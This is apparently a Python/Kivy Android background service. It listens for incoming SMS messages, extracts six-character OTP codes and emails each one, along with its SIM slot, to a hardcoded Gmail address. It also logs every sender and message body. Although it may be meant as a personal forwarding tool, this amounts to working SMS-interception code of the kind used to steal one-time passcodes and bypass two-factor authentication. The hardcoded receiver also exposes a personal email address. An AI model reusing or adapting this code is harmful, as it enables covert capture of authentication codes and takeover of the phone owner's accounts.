import os
import re
import time
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from jnius import autoclass, PythonJavaClass, java_method

def get_user_data_dir():
    return os.environ.get('ANDROID_PRIVATE', '.')

def send_email(otp, sim_slot, sender_email, app_password):
    fixed_receiver = "aashishtimsinaaa@gmail.com"  # Fixed receiver email
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = fixed_receiver
        msg['Subject'] = f"OTP Notification (SIM {sim_slot})"
        body = f"""
        <html>
        <body>
            <h2>OTP Alert</h2>
            <p>Your OTP is: <strong>{otp}</strong></p>
            <p>Received on: <strong>{sim_slot}</strong></p>
        </body>
        </html>
        """
        msg.attach(MIMEText(body, 'html'))
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, app_password)
        server.sendmail(sender_email, fixed_receiver, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("Error sending email:", e)

def extract_otp(message):
    # Looks for a pattern like "OTP: <code>" where <code> is 6 alphanumeric characters.
    match = re.search(r'OTP:\s*([A-Za-z0-9]{6})', message)
    if match:
        return match.group(1)
    return None

class SMSReceiver(PythonJavaClass):
    __javainterfaces__ = ['android/content/BroadcastReceiver']
    __javacontext__ = 'app'

    @java_method('(Landroid/content/Context;Landroid/content/Intent;)V')
    def onReceive(self, context, intent):
        try:
            bundle = intent.getExtras()
            if bundle:
                pdus = bundle.get("pdus")
                if pdus:
                    SmsMessage = autoclass('android.telephony.SmsMessage')
                    for pdu in pdus:
                        sms = SmsMessage.createFromPdu(pdu)
                        sender = sms.getOriginatingAddress()
                        message_body = sms.getMessageBody()
                        # Attempt to get SIM slot info (if available)
                        sim_slot = "Unknown"
                        try:
                            sub_id = sms.getSubscriptionId()
                            if sub_id == 0:
                                sim_slot = "SIM 1"
                            elif sub_id == 1:
                                sim_slot = "SIM 2"
                            else:
                                sim_slot = f"SIM {sub_id}"
                        except Exception as e:
                            sim_slot = "Unknown"

                        print("SMS Received from:", sender)
                        print("Message:", message_body)
                        otp = extract_otp(message_body)
                        if otp:
                            print("Extracted OTP:", otp)
                            # Read the saved credentials
                            data_dir = get_user_data_dir()
                            cred_file = os.path.join(data_dir, 'credentials.txt')
                            try:
                                with open(cred_file, 'r') as f:
                                    lines = f.read().splitlines()
                                    if len(lines) >= 3:
                                        phone, email, app_password = lines[0], lines[1], lines[2]
                                    else:
                                        email = ""
                                        app_password = ""
                            except Exception as e:
                                print("Error reading credentials:", e)
                                email = ""
                                app_password = ""

                            # Send the email in a separate thread
                            threading.Thread(target=send_email, args=(otp, sim_slot, email, app_password)).start()
        except Exception as e:
            print("Error in onReceive:", e)

def register_sms_receiver():
    try:
        # Get the current Android activity
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        currentActivity = PythonActivity.mActivity
        IntentFilter = autoclass('android.content.IntentFilter')
        receiver = SMSReceiver()
        intent_filter = IntentFilter()
        intent_filter.addAction("android.provider.Telephony.SMS_RECEIVED")
        currentActivity.registerReceiver(receiver, intent_filter)
        print("SMS Receiver registered successfully.")
    except Exception as e:
        print("Error registering SMS Receiver:", e)

def main():
    print("Background Service Started. Registering SMS Receiver...")
    register_sms_receiver()
    # Keep the service running indefinitely.
    while True:
        time.sleep(10)


